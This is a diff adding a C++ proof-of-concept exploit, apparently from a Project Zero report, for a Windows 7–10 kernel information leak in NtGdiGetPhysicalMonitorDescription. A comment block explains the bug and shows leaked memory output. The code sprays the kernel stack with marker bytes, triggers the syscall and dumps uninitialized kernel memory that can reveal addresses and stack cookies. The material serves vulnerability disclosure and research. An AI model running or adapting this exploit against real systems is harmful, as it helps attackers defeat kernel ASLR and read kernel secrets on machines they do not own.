@@ -1,0 +1,156 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1268
+
+We have discovered that the nt!NtGdiGetPhysicalMonitorDescription system call discloses portions of uninitialized kernel stack memory to user-mode clients, on Windows 7 to Windows 10.
+
+This is caused by the fact that the syscall copies a whole stack-based array of 256 bytes (128 wide-chars) to the caller, but typically only a small portion of the buffer is used to store the requested monitor description, while the rest of it remains uninitialized. This memory region contains sensitive information such as addresses of executable images, kernel stack, kernel pools and stack cookies.
+
+The attached proof-of-concept program demonstrates the disclosure by spraying the kernel stack with a large number of 0x41 ('A') marker bytes, and then calling the affected system call. An example output is as follows:
+
+--- cut ---
+00000000: 47 00 65 00 6e 00 65 00 72 00 69 00 63 00 20 00 G.e.n.e.r.i.c. .
+00000010: 4e 00 6f 00 6e 00 2d 00 50 00 6e 00 50 00 20 00 N.o.n.-.P.n.P. .
+00000020: 4d 00 6f 00 6e 00 69 00 74 00 6f 00 72 00 00 00 M.o.n.i.t.o.r...
+00000030: 74 00 6f 00 72 00 2e 00 64 00 65 00 76 00 69 00 t.o.r...d.e.v.i.
+00000040: 63 00 65 00 64 00 65 00 73 00 63 00 25 00 3b 00 c.e.d.e.s.c.%.;.
+00000050: 47 00 65 00 6e 00 65 00 72 00 69 00 63 00 20 00 G.e.n.e.r.i.c. .
+00000060: 4e 00 6f 00 6e 00 2d 00 50 00 6e 00 50 00 20 00 N.o.n.-.P.n.P. .
+00000070: 4d 00 6f 00 6e 00 69 00 74 00 6f 00 72 00 00 00 M.o.n.i.t.o.r...
+00000080: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+00000090: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+000000a0: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+000000b0: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+000000c0: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+000000d0: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+000000e0: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+000000f0: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+--- cut ---
+
+If the stack spraying part of the PoC code is disabled, we can immediately observe various kernel-mode addresses in the dumped memory area.
+
+Repeatedly triggering the vulnerability could allow local authenticated attackers to defeat certain exploit mitigations (kernel ASLR) or read other secrets stored in the kernel address space.
+*/
+
+#include <Windows.h>
+#include <PhysicalMonitorEnumerationAPI.h>
+#include <cstdio>
+
+extern "C"
+NTSTATUS WINAPI NtMapUserPhysicalPages(
+  PVOID BaseAddress,
+  ULONG NumberOfPages,
+  PULONG PageFrameNumbers
+  );
+
+NTSTATUS(WINAPI *GetPhysicalMonitorDescription)(
+  _In_   HANDLE hMonitor,
+  _In_   DWORD dwPhysicalMonitorDescriptionSizeInChars,
+  _Out_  LPWSTR szPhysicalMonitorDescription
+  );
+
+#define PHYSICAL_MONITOR_DESCRIPTION_SIZE 128
+#define STATUS_SUCCESS                    0
+
+VOID PrintHex(PBYTE Data, ULONG dwBytes) {
+  for (ULONG i = 0; i < dwBytes; i += 16) {
+    printf("%.8x: ", i);
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes) {
+        printf("%.2x ", Data[i + j]);
+      }
+      else {
+        printf("?? ");
+      }
+    }
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes && Data[i + j] >= 0x20 && Data[i + j] <= 0x7e) {
+        printf("%c", Data[i + j]);
+      }
+      else {
+        printf(".");
+      }
+    }
+
+    printf("\n");
+  }
+}
+
+VOID MyMemset(PVOID ptr, BYTE byte, ULONG size) {
+  PBYTE _ptr = (PBYTE)ptr;
+  for (ULONG i = 0; i < size; i++) {
+    _ptr[i] = byte;
+  }
+}
+
+VOID SprayKernelStack() {
+  // Buffer allocated in static program memory, hence doesn't touch the local stack.
+  static SIZE_T buffer[1024];
+
+  // Fill the buffer with 'A's and spray the kernel stack.
+  MyMemset(buffer, 'A', sizeof(buffer));
+  NtMapUserPhysicalPages(buffer, ARRAYSIZE(buffer), (PULONG)buffer);
+
+  // Make sure that we're really not touching any user-mode stack by overwriting the buffer with 'B's.
+  MyMemset(buffer, 'B', sizeof(buffer));
+}
+
+int main() {
+  WCHAR OutputBuffer[PHYSICAL_MONITOR_DESCRIPTION_SIZE];
+
+  HMODULE hGdi32 = LoadLibrary(L"gdi32.dll");
+  GetPhysicalMonitorDescription = (NTSTATUS(WINAPI *)(HANDLE, DWORD, LPWSTR))GetProcAddress(hGdi32, "GetPhysicalMonitorDescription");
+
+  // Create a window for referencing a monitor.
+  HWND hwnd = CreateWindowW(L"BUTTON", L"TestWindow", WS_OVERLAPPEDWINDOW | WS_VISIBLE,
+                            CW_USEDEFAULT, CW_USEDEFAULT, 100, 100, NULL, NULL, 0, 0);
+
+  /////////////////////////////////////////////////////////////////////////////
+  // Source: https://msdn.microsoft.com/en-us/library/windows/desktop/dd692950(v=vs.85).aspx
+  /////////////////////////////////////////////////////////////////////////////
+  HMONITOR hMonitor = NULL;
+  DWORD cPhysicalMonitors;
+  LPPHYSICAL_MONITOR pPhysicalMonitors = NULL;
+
+  // Get the monitor handle.
+  hMonitor = MonitorFromWindow(hwnd, MONITOR_DEFAULTTOPRIMARY);
+
+  // Get the number of physical monitors.
+  BOOL bSuccess = GetNumberOfPhysicalMonitorsFromHMONITOR(hMonitor, &cPhysicalMonitors);
+
+  if (bSuccess) {
+    // Allocate the array of PHYSICAL_MONITOR structures.
+    pPhysicalMonitors = (LPPHYSICAL_MONITOR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cPhysicalMonitors * sizeof(PHYSICAL_MONITOR));
+
+    if (pPhysicalMonitors != NULL) {
+      // Get the array.
+      bSuccess = GetPhysicalMonitorsFromHMONITOR(hMonitor, cPhysicalMonitors, pPhysicalMonitors);
+
+      if (bSuccess) {
+        for (DWORD i = 0; i < cPhysicalMonitors; i++) {
+          RtlZeroMemory(OutputBuffer, sizeof(OutputBuffer));
+          
+          SprayKernelStack();
+
+          NTSTATUS st = GetPhysicalMonitorDescription(pPhysicalMonitors[i].hPhysicalMonitor, PHYSICAL_MONITOR_DESCRIPTION_SIZE, OutputBuffer);
+          if (st == STATUS_SUCCESS) {
+            PrintHex((PBYTE)OutputBuffer, sizeof(OutputBuffer));
+          } else {
+            printf("[-] GetPhysicalMonitorDescription failed, %x\n", st);
+          }
+        }
+
+        // Close the monitor handles.
+        bSuccess = DestroyPhysicalMonitors(cPhysicalMonitors, pPhysicalMonitors);
+      }
+
+      // Free the array.
+      HeapFree(GetProcessHeap(), 0, pPhysicalMonitors);
+    }
+  }
+
+  DestroyWindow(hwnd);
+
+  return 0;
+}
